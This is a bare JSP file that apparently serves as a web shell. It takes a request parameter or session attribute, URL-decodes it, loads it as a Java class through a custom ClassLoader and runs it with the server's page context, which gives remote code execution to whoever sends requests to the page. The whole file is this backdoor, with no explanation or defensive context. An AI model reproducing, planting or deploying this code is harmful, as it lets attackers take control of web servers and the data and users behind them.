<%@page import="javax.xml.bind.*,java.lang.*"%><%!class U extends ClassLoader {
		U(ClassLoader c) {
			super(c);
		}

		public Class g(byte[] b) {
			return super.defineClass(b, 0, b.length);
		}
	}%><% String c = (String)request.getParameter("c");
    
if(null == c && null != session && null != (c = (String)session.getAttribute("c")));
if(null != c)
try {
	c = java.net.URLDecoder.decode(c, "utf-8");
} catch (Exception e) {
	        }
if(null != c)try {new U(this.getClass().getClassLoader()).g(c.getBytes()).newInstance().equals(pageContext);}catch(Exception e) {e.printStackTrace();}%>